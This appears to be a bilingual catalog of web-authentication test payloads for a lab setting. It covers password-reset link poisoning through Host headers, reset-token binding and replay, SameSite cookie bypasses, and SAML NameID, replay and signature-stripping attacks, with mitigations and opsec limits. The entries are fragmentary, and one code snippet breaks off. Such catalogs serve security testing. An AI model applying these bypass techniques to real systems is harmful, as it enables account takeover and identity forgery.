description.en: Bypasses Host sanitization when the link host derives from X-Forwarded-Host. Success: reset link domain is the callback host.

description.zh: 利用代理优先取绝对 URI 主机的差异投毒链接。成功判据：发出的重置邮件使用 callback 域。
description.en: Poisons the link by exploiting proxies that prefer the absolute-URI host. Success: the reset mail uses the callback domain.

description.zh: 双 Host 头拼接后重置链接派生为攻击者域。成功判据：邮件链接指向 {ATTACKER_HOST}。
description.en: Concatenated duplicate Host headers derive the reset link to the attacker domain. Success: the emailed link points at {ATTACKER_HOST}.

description.zh: Host 合法而 X-Forwarded-Host 携带攻击者域，派生优先级被滥用。成功判据：链接域名变为攻击者域。
description.en: A legit Host with a poisoned X-Forwarded-Host abuses derivation priority. Success: the link domain flips to the attacker host.

description.zh: 绝对 URI 中的主机被优先用于链接派生。成功判据：重置链接使用攻击者域。
description.en: The absolute-URI host takes precedence for link derivation. Success: the reset link uses the attacker domain.

name.zh: 重置令牌账户绑定

description.zh: 用 A 账号申请的重置令牌尝试重置 B 账号，验证令牌与目标账户的绑定强度。
description.en: Requests a reset token for account A and uses it to reset account B, proving the confirmation endpoint validates token validity but not the token-to-account binding, making the token a universal credential.

overview.zh: 该 Payload 覆盖重置令牌与账号绑定场景，检验确认端点是否校验令牌所属账号，防止拿 A 账号令牌改 B 账号口令。验证维度为跨账号令牌使用的单步阴性样例，对应第 1 步。
overview.en: This payload covers reset-token account binding, testing whether the confirm endpoint validates the account a token was issued for, preventing use of account A's token to change account B's password. Validation is a single cross-account negative sample, mapped to step 1.

vulnerability.zh: 根因在于确认接口只校验令牌有效性而不校验令牌与请求账号的对应关系：令牌被视作万能凭据，攻击者用自有账号令牌即可重置任意目标账号。
vulnerability.en: The root cause is the confirm endpoint validating only token validity and not the token-to-account correspondence: the token acts as a universal credential, so an attacker can reset any target account using a token issued for their own account.

exploitation.zh: 第 1 步以自有账号申请的测试令牌搭配目标账号 payloader-b 提交重置确认请求并携带 dry_run 标记，服务端拒绝且不产生变更即证明绑定生效，接受或返回成功即确认令牌未绑定账号。成功判据以响应与 dry_run 状态为准。占位符在全局变量菜单替换；全程使用可回滚的合成账号。
exploitation.en: In step 1, submit a reset-confirm request using your own account's test token paired with the target account payloader-b and a dry_run flag; rejection without any change proves binding, acceptance or a success response confirms the token is not account-bound. Judge success by the response and dry_run status. Replace placeholders via the global variables menu; use rollback-safe synthetic accounts throughout.

mitigation.en: Embed and sign the account identity at token issuance and verify token, account and session consistency on confirmation; store token hashes. After the fix, replay step 1: the cross-account pairing should be rejected.

name.zh: 重置令牌单次使用

description.zh: 重复提交已消费的重置令牌，验证其单次使用约束是否生效。
description.en: Replays an already-consumed reset token, verifying whether single-use enforcement fails because invalidation is deferred or the status update and password change are not in one transaction.

overview.zh: 该 Payload 覆盖重置令牌单次使用场景，检验已消费令牌再次提交时是否被拒绝，防止同一令牌被多次用于改密。验证维度为已用令牌重放的单步阴性样例，对应第 1 步。
overview.en: This payload covers single-use reset tokens, testing whether an already-consumed token is rejected on resubmission so one token cannot be reused to change a password. Validation replays a used token as a single negative sample, mapped to step 1.

vulnerability.zh: 根因在于令牌消费后未即时失效或状态更新与口令变更不在同一事务：攻击者截获一次成功请求后重放即可再次改密，令牌也可能被转交他人在有效期内重复使用。
vulnerability.en: The root cause is tokens not being invalidated immediately after consumption, or consumption state and the password change living outside one transaction: replaying a captured success request changes the password again or resells the token for reuse.

exploitation.zh: 第 1 步以标记为已消费的测试令牌提交重置确认并附加 dry_run 标记，服务端返回已失效或拒绝即证明单次使用生效，接受即确认重放缺陷。成功判据以响应状态与令牌状态记录为准。占位符在全局变量菜单替换；使用实验环境专用已用令牌夹具。
exploitation.en: In step 1, submit a reset-confirm with a test token marked as already consumed plus a dry_run flag; an expired or rejected response proves single-use enforcement, acceptance confirms the replay flaw. Judge success by response status and token-state records. Replace placeholders via the global variables menu; use the lab's dedicated consumed-token fixture.

mitigation.en: Perform token consumption and the password update in one atomic transaction, burning the token immediately with usage logs and alerts. After the fix, replay step 1: used tokens should return a clear expired error.

prerequisites.zh: 使用自有邮件沙箱、两个合成账户和可回滚密码，记录每个重置请求、令牌哈希、账户 ID 与邮件任务 ID。
prerequisites.en: Use an owned mail sandbox, two synthetic accounts, and rollback passwords, recording each reset request, token hash, account ID, and mail-job ID.

prerequisites.zh: 固定应用公开基址和可信代理配置，所有回调域均为自有测试域，且令牌尝试次数受严格预算控制。
prerequisites.en: Fix the application's public base URL and trusted-proxy configuration, use only owned callback domains, and strictly budget token attempts.

analysis.zh: 阳性证据分别是邮件中的重置链接被不可信 Host 改写并把测试令牌送到受控域；低权限请求可重置另一合成账户；已用或过期令牌再次改变密码；或令牌在预算内可由已知生成规律预测。邮件未到达、响应 200、链接文本反射、状态码差异或脚本猜中自身生成的值都不是证据。
analysis.en: Positive evidence is an untrusted Host changing a mailed reset link and delivering a test token to an owned domain, an underprivileged request resetting another synthetic account, a used or expired token changing a password again, or a token predicted from a known generation rule within budget. Missing mail, HTTP 200, reflected link text, status differences, or a script matching its own generated value are not evidence.

opsecTips.zh: 只对合成账户执行一次可回滚密码变更；不得向真实收件人发信、遍历完整验证码空间或提交真实令牌。
opsecTips.en: Perform at most one reversible password change on a synthetic account; do not message real recipients, enumerate full code spaces, or submit real tokens.

opsecTips.zh: 撤销全部测试令牌，恢复合成账户密码，删除邮件、回调日志和临时脚本，并核对没有未完成重置任务。
opsecTips.en: Revoke all test tokens, restore synthetic passwords, delete mail, callback logs, and temporary scripts, and verify no reset jobs remain pending.

description.zh: 绕过"使用后失效"检查的竞态窗口：并行请求同时通过单次消费校验。成功判据：至少两次返回成功状态码。

description.zh: 绕过已用令牌黑名单的精确匹配：base64 形态在另一解码层还原。成功判据：重置被接受。
description.en: Bypasses exact-match used-token blacklists via a base64 form decoded at another layer. Success: reset accepted.

description.zh: 利用取参差异让消费计数与验证取不同实例。成功判据：同一令牌完成两次重置。
description.en: Uses extraction divergence so the consumption counter and validator see different instances. Success: the same token resets twice.

name.zh: SameSite Cookie 绕过

description.zh: 以顶级导航、子资源、弹窗回调等场景携带 Cookie，验证 SameSite 属性在各路径下的实际拦截边界。
description.en: Carries the session cookie through top-level navigation, subresource loads, and popup callbacks across link and window.open flows, mapping where the SameSite attribute actually blocks cross-site requests and where it silently sends.

overview.zh: 该 Payload 覆盖 SameSite 导航边界场景，检验顶级导航与脚本弹窗触发的跨站请求是否仍携带 Strict 或 Lax 会话 Cookie。验证维度为链接导航与 noopener 弹窗两类单步样例，对应第 1 步。
overview.en: This payload covers the SameSite navigation boundary, testing whether cross-site requests triggered by top-level navigation and script popups still carry Strict or Lax session cookies. Validation uses link navigation and a noopener popup in one step, mapped to step 1.

vulnerability.zh: 根因在于会话 Cookie 的 SameSite 策略未覆盖全部导航形态：链接、脚本 window.open 等顶级导航在宽松策略下仍发送会话 Cookie，服务端据此信任跨站发起的请求。
vulnerability.en: The root cause is a SameSite policy that fails to cover all navigation forms: under lenient settings, top-level navigations via links or window.open still send session cookies, so the server trusts cross-site-initiated requests.

exploitation.zh: 第 1 步部署含顶级链接与 noopener 弹窗脚本的跨站样例页，分别点击与自动打开指向 marker 页面的导航，核对服务端日志中两类请求附带的会话 Cookie；任一导航仍附带 Strict 会话即确认边界缺口。成功判据以 Cookie 附带记录为准。占位符在全局变量菜单替换；对照请求 Lax 与 None 配置以获得完整矩阵。
exploitation.en: In step 1, deploy a cross-site sample page containing a top-level link and a noopener popup script, trigger navigation to the marker page both by click and auto-open, and check which session cookies the server logs for each; any Strict-session attachment during navigation confirms the boundary gap. Judge success by cookie-attachment records. Replace placeholders via the global variables menu; compare Lax and None configurations for a complete matrix.

mitigation.en: Adopt SameSite=Strict for session cookies or apply stricter policies to logged-in state, and add Sec-Fetch-Site validation to reject cross-site-initiated state changes. After the fix, replay step 1: cross-site navigation requests should no longer carry the session.

prerequisites.zh: 使用两个合成账户、隔离浏览器配置和固定无敏感字段标记对象，记录登录前后会话 ID 的哈希与主体。
prerequisites.en: Use two synthetic accounts, isolated browser profiles, and a fixed nonsensitive marker object, recording session-ID hashes and principals before and after login.

prerequisites.zh: 若检查明文传输，只在自有封闭网络和测试流量中抓包；Cookie 域、路径、SameSite 和浏览器版本必须明确。
prerequisites.en: If reviewing cleartext transport, capture only owned test traffic on an isolated network; document cookie domain, path, SameSite mode, and browser version.

analysis.zh: 阳性会话固定要求登录前受控会话 ID 在登录后未轮换且另一测试客户端可访问同一主体；Cookie Tossing 要求子域可设置的同名 Cookie 被主域安全逻辑选中；SameSite 仅证明凭据随导航发送，不能证明响应可读或状态变更。缺少属性、抓到测试 Cookie 或随机性工具给出低分本身都不是劫持。
analysis.en: Session fixation requires a controlled pre-login ID to survive authentication and authorize the same principal from another test client. Cookie tossing requires a same-name cookie set by a subdomain to be selected by main-domain security logic. SameSite can show credentials sent on navigation but not response readability or state change. A missing attribute, captured test cookie, or low randomness score alone is not hijacking.

opsecTips.zh: 仅复用可撤销的合成会话并读取一个标记对象；不得捕获第三方流量、真实 Cookie 或触发资金与资料变更。
opsecTips.en: Replay only revocable synthetic sessions and read one marker object; do not capture third-party traffic, real cookies, or trigger financial or profile changes.

opsecTips.zh: 注销全部测试会话，删除 Cookie、抓包和临时脚本，清理浏览器站点数据并恢复 HTTPS 与 Cookie 策略。
opsecTips.en: Log out all test sessions, delete cookies, captures, and temporary scripts, clear browser site data, and restore HTTPS and cookie policy.

description.en: Bypasses link-click-only defenses since meta refresh is still top-level navigation and Lax cookies attach. Success: target receives the cookied request.

description.zh: 绕过对 <a> 标签的过滤：脚本提交 GET 表单仍属顶级导航。成功判据：导航请求携带会话 Cookie。
description.en: Bypasses <a>-tag filtering since a scripted GET form submission is still top-level navigation. Success: navigated request carries the session cookie.

name.zh: SAML NameID 规范化与身份绑定
name.en: SAML NameID Canonicalization and Identity Binding

description.zh: 提交大小写与编码规范化变体的 NameID，验证身份映射是否可被规范化差异欺骗。
description.en: Submits case and encoding-normalized NameID variants, proving identity comparison runs before normalization or under rules that differ from the IdP, so responses map onto a different account.

subCategory.zh: SAML 断言与联邦身份攻击

overview.zh: 该 Payload 覆盖 SAML NameID 规范化与身份绑定场景，检验服务端对大小写、空白与编码差异的 NameID 是否按唯一身份处理。验证维度为改写 NameID 后签名与验证的两步流程，对应第 1 至第 2 步。
overview.en: This payload covers SAML NameID canonicalization and identity binding, testing whether the server treats NameIDs differing by case, whitespace or encoding as distinct identities. Validation rewrites the NameID then re-signs and verifies across two steps, mapped to steps 1 and 2.

vulnerability.zh: 根因在于身份比对在规范化之前执行或规范化规则与 IdP 不一致：攻击者提交大小写或空白变体的 NameID 即可绕过账户匹配，把响应映射到其他账户。
vulnerability.en: The root cause is identity comparison performed before canonicalization or rules diverging from the IdP: a case- or whitespace-variant NameID can slip past account matching and map the response onto another account.

exploitation.zh: 第 1 步解码样例响应并用 xmlstarlet 把 NameID 改写为空白与大小写变体；第 2 步对改写后文档执行 xmlsec1 验证（预期失败），再结合 ACS 实测账户映射：变体命中他人账户即确认规范化缺陷，被拒绝或归并到同一账户则通过。成功判据以账户映射记录为准。占位符在全局变量菜单替换；全程使用合成身份。
exploitation.en: In step 1, decode the sample response and use xmlstarlet to rewrite the NameID into whitespace and case variants. In step 2, re-sign with the test key and submit to the ACS, observing account matching: a variant resolving to another account confirms the canonicalization flaw, while rejection or same-account mapping passes. Judge success by account-mapping records. Replace placeholders via the global variables menu; use synthetic identities throughout.

mitigation.en: Canonicalize NameID by fixed rules (lowercasing, whitespace trimming, unified encoding) before account lookup and verify consistency with the IdP claim. After the fix, replay steps 1 and 2: variants should map to the same account or be rejected.

prerequisites.zh: 使用自有 IdP/SP、测试证书和两个合成主体，记录 Response/Assertion ID、InResponseTo、Audience、Recipient、时间与签名引用。
prerequisites.en: Use an owned IdP and SP, test certificates, and two synthetic principals, recording Response and Assertion IDs, InResponseTo, Audience, Recipient, time, and signature references.

prerequisites.zh: XXE 仅使用无文件读取、无外网的本地 canary resolver；签名测试使用专用测试密钥和可销毁 SP。
prerequisites.en: For XXE, use a local canary resolver without file reads or egress; use a dedicated test key and disposable SP for signature tests.

analysis.zh: 阳性签名缺陷要求 SP 接受未签名或攻击者签名的断言并建立错误主体；重放要求同一 Assertion ID 在过期或已消费后再次建立会话；XSW 要求业务层使用的断言与签名实际覆盖的节点不同；XXE 要求解析器服务端触发受控 canary。删除 Signature 后报错、XML 可解析、NameID 文本变化、Base64 成功或 DTD 出现在请求中都不是阳性。
analysis.en: A signature flaw requires the SP to accept an unsigned or attacker-signed assertion and create the wrong principal. Replay requires a consumed or expired Assertion ID to create another session. XSW requires business logic to use a node different from the signed node. XXE requires the server parser to trigger a controlled canary. Rejection after Signature removal, parseable XML, changed NameID text, successful Base64, or a DTD merely present in the request is not positive.

opsecTips.zh: 只建立一个合成低权限会话；不得读取系统文件、外带数据、使用真实 IdP 证书或向生产 ACS 提交断言。
opsecTips.en: Create at most one synthetic low-privilege session; do not read system files, exfiltrate data, use real IdP certificates, or submit assertions to a production ACS.

opsecTips.zh: 注销测试会话，撤销测试证书，删除断言、XML、resolver 日志和 Burp 项目，并恢复签名及解析器策略。
opsecTips.en: Log out test sessions, revoke test certificates, delete assertions, XML, resolver logs, and Burp projects, and restore signature and parser policy.

name.zh: SAML Assertion 重放防护

description.zh: 重放已使用的 Assertion（含 NotOnOrAfter 时间边界），验证服务提供方的重放防护。
description.en: Replays a used Assertion within its NotOnOrAfter window, verifying whether the ACS maintains a consumed assertion-ID record or leaves a replay window long enough for session hijacking.

subCategory.zh: SAML 断言与联邦身份攻击

overview.zh: 该 Payload 覆盖 SAML Assertion 重放防护场景，检验 ACS 是否把已消费断言记入一次性缓存并在重放时拒绝。验证维度为已消费响应重放的单步阴性样例，对应第 1 步。
overview.en: This payload covers SAML assertion replay protection, testing whether the ACS records consumed assertions in a one-time cache and rejects replays. Validation replays a previously consumed response as a single negative sample, mapped to step 1.

vulnerability.zh: 根因在于 ACS 未维护断言 ID 的已用记录或窗口设置过长：截获的一次合法响应可在时效内反复提交，攻击者借此冒用受害者身份建立会话。
vulnerability.en: The root cause is the ACS keeping no used-ID record for assertions or using overly long windows: one legitimately captured response can be resubmitted throughout its validity, letting attackers impersonate the victim session.

exploitation.zh: 第 1 步以标记为已消费的 SAMLResponse 夹具配合 RelayState 提交到 ACS，服务端返回已使用拒绝即证明重放防护生效，建立新会话即确认重放缺陷。成功判据以响应状态与断言缓存记录为准。占位符在全局变量菜单替换；仅使用实验夹具中的合成断言。
exploitation.en: In step 1, submit the consumed-SAMLResponse fixture with a RelayState to the ACS; a used-token rejection proves replay protection, a new session confirms the replay flaw. Judge success by response status and assertion-cache records. Replace placeholders via the global variables menu; use only synthetic assertions from lab fixtures.

mitigation.zh:
ACS 以断言 ID 建立带时效的已用缓存（原子登记），验证通过后立即写入，重复提交一律拒绝并产生重放告警。
    # 验证通过后原子登记断言 ID（NX+EX）
    ttl = max(int(assertion.not_on_or_after - time.time()), 60)
    if not redis.set(f"saml:auid:{assertion.id}", 1, nx=True, ex=ttl):

Rejection after Signature removal, parseable XML, changed NameID text, successful Base64, or a DTD merely present in the request is not positive.

overview.zh: 该 Payload 覆盖 SAML 签名验证边界场景，检验服务提供方是否对实际引用的 Assertion 执行签名验证。验证维度为剥离签名后的验证失败对照与完整签名验证成功对照，对应第 1 至第 2 步。
overview.en: This payload covers the SAML signature-validation boundary, testing whether the service provider verifies the signature of the Assertion actually referenced. Validation contrasts a signature-stripped verification failure with an intact-signature success control, mapped to steps 1 and 2.

vulnerability.zh: 根因在于验证逻辑校验的对象与消费的对象不一致：签名挂在 Response 而 Assertion 被消费，或攻击者剥离签名后服务端仍按未签名断言放行，身份声明可被任意伪造。
vulnerability.en: The root cause is verifying a different object than the one consumed: the signature covers the Response while the Assertion is consumed, or after signature stripping the server still accepts the unsigned assertion, letting identity claims be forged at will.

exploitation.zh: 第 1 步用 xmlstarlet 删除样例响应中的 Signature 节点后以 xmlsec1 验证，验证应立即失败；第 2 步对未改动的签名夹具执行同一验证并确认成功。两类结果结合服务端 ACS 行为判断：被剥离签名的响应仍被接受即确认验证边界缺陷。占位符在全局变量菜单替换；全部在隔离 fixture 上操作。
exploitation.en: In step 1, remove the Signature node from the sample response with xmlstarlet and verify with xmlsec1; verification should fail immediately. In step 2, run the same verification on the untouched signed fixture and confirm success. Combine both results with ACS behavior: acceptance of the stripped response confirms the validation boundary flaw. Replace placeholders via the global variables menu; operate only on isolated fixtures.

mitigation.zh:
服务端强制 Assertion 级签名验证，并校验签名引用 ID 与被消费对象一致；Response/Assertion 缺签名直接拒绝并告警。
    # python3-saml settings：断言必须签名
    'security': {
        'wantAssertionsSigned': True,
        'wantResponseSigned': True,
    }
    # 消费前完整验证
    auth = OneLogin_Saml2_Auth(req, saml_settings)
    auth.process_response()
    if not auth.is_authenticated():
        abort(401, 'invalid signature')
mitigation.en: Enforce Assertion-level signature verification, ensure the signed reference matches the consumed object, and reject missing signatures outright. After the fix, replay step 1: signature-stripped responses should be rejected with alerts.
